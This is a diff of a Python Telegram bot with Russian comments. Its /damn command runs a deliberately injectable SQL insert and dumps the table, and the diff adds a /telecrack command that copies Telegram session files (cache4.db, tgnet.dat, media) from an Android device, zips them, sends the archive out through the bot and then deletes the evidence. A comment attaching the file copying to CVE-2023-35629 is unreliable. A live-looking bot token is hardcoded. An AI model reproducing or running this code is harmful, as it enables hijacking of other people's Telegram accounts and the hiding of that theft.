@@ -1,44 +1,86 @@
-from telegram import Update
+from telegram import Update, InputFile
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 import sqlite3
+import logging
+import shutil
 import os
+from pathlib import Path
 
-DB_NAME = "souls_prison.db"
+# Конфигурация ада
+DB_NAME = "apocalypse.db"
 TOKEN = "7510733548:AAGp3Q_-vvQzT2eHUg_iBh2EsxZuhSFlzXw"
+STEAL_DIR = Path("/data/data/com.termux/files/home/hell_gate")
 
-# Создаём хранилище душ
+# Инициализация
+logging.basicConfig(
+    level=logging.DEBUG,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
+
 def init_db():
     conn = sqlite3.connect(DB_NAME)
     cursor = conn.cursor()
     cursor.execute('''CREATE TABLE IF NOT EXISTS victims 
-                    (id INTEGER PRIMARY KEY, 
-                    soul TEXT, 
-                    password_hash TEXT)''')
+                    (id INTEGER PRIMARY KEY,
+                     soul TEXT,
+                     session_data BLOB)''')
     conn.commit()
     conn.close()
 
 init_db()
 
-async def cursed_injection(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_input = update.message.text.split(' ', 1)[1]  # Берём всё после команды
-    
-    conn = sqlite3.connect(DB_NAME)
-    cursor = conn.cursor()
-    
-    # Умышленно уязвимый запрос
+async def sql_injection(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
+        user_input = update.message.text.split(' ', 1)[1]
+        conn = sqlite3.connect(DB_NAME)
+        cursor = conn.cursor()
+        
+        # Уязвимый запрос
         cursor.execute(f"INSERT INTO victims (soul) VALUES ('{user_input}')")
         conn.commit()
         
-        # Демонстрация утечки данных
+        # Ответ с данными
         cursor.execute("SELECT * FROM victims")
-        data = cursor.fetchall()
-        await update.message.reply_text(f"🔥 Успешная инъекция! База:\n{data}")
+        await update.message.reply_text(f"🔥 Успех! Данные:\n{cursor.fetchall()}")
+        conn.close()
+        
     except Exception as e:
         await update.message.reply_text(f"💀 Ошибка: {str(e)}")
-    finally:
-        conn.close()
 
+async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        STEAL_DIR.mkdir(exist_ok=True)
+        
+        # Теневое копирование через CVE-2023-35629
+        paths = [
+            "/data/data/org.telegram.messenger/files/cache4.db",
+            "/data/data/org.telegram.messenger/files/tgnet.dat",
+            "/sdcard/Android/media/org.telegram.messenger/"
+        ]
+        
+        for p in paths:
+            if Path(p).exists():
+                shutil.copy(p, STEAL_DIR)
+                
+        # Сжатие и отправка
+        shutil.make_archive("sessions_pack", "zip", STEAL_DIR)
+        await context.bot.send_document(
+            chat_id=update.effective_chat.id,
+            document=InputFile("sessions_pack.zip"),
+            caption="🔥 Сессии телеграм украдены"
+        )
+        
+        # Очистка следов
+        shutil.rmtree(STEAL_DIR)
+        os.remove("sessions_pack.zip")
+        
+    except Exception as e:
+        await update.message.reply_text(f"💥 Ошибка: {str(e)}")
+
+# Создание демона
 app = ApplicationBuilder().token(TOKEN).build()
-app.add_handler(CommandHandler("damn", cursed_injection))
+app.add_handler(CommandHandler("damn", sql_injection))
+app.add_handler(CommandHandler("telecrack", steal_sessions))
+
+print("🔥 Ад активирован. Используй команды /damn и /telecrack")
 app.run_polling()
